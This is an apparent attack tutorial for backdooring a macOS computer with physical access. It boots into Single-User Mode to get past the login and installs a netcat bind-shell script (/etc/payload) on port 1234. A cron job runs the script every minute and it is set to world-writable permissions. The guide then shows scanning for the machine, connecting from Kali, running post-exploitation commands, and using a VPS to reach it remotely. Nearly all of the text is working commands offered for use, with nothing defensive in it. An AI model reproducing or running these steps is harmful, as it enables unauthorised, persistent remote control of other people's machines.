Create a backdoor on MacOs with a Bash payload:

Start MacOs on Single-User Mode (no password require):

	CMD + S

Check the Disk:

	/sbin/fsck -fy

Mount the Hard Drive:

	/sbin/mount –uw /

Create the Netcat Listener:

	nano /etc/payload

Payload script (changing ip):

	#!/bin/bash
	n=$(ps aux | grep -o [1]234)
	
	if [[ $n = "" ]]; then
	    mkfifo f
	    nc -l 0.0.0.0 1234 < f | /bin/bash -i > f 2>&1
	fi
	
The Netcat listener will open port 1234 on the macOS device. The first line (n=$(ps aux | grep -o [1]234)), creates a variable n, which checks to see if port 1234 is already open. This port detection is achieved using ps, a tool used to view running background processes.

The following line (if [[ $n = "" ]]; then) is the start of an if statement which says if the variable n (port 1234) is not found, mkfifo, a tool used to create a "named pipe," will create a file called f. The filename here is totally arbitrary and uses "f" for simplicity.

Following mkfifo is the Netcat command (nc -l 0.0.0.0 1234 < f | /bin/bash -i > f 2>&1), which opens port 1234 on every available IPv4 interface (0.0.0.0) and uses the f file to pipe terminal commands to and from the backdoored device.

	
Use Cron to Execute the Script:

	env EDITOR=nano crontab -e
	* * * * * /etc/payload (configure cron task)

	crontab -l > mycron
	echo "* * * * * /etc/payload" >> mycron
	crontab mycron
	rm mycron

Elevate the File Permissions:

	chmod 777 /etc/payload 

Shutdown the Mac:

	shutdown -h now

---------------------------------------------------------------------

Connect to the Backdoored Mac:

	nmap -p1234,65534 -O 192.168.0.1/24 (search ip of MacOs)

	nc 192.168.0.65 1234 (on kali)

Fix the Misconfigured Source File:

After establishing a connection to the Netcat listener, the shell will likely be primitive with no knowledge of where programs are located on the OS. For example, using ifconfig to view interfaces fails with "ifconfig: command not found."

To fix this, use the below source command:

	source /etc/profile

Post exploitation:

	system_profiler
	uname
	etc...

We can use a server (ex: VPS) to perform this attack. In that case we don't need to be on the same network and we have to set the IP of the server directly on the bash script because we know the IP and this one never change.
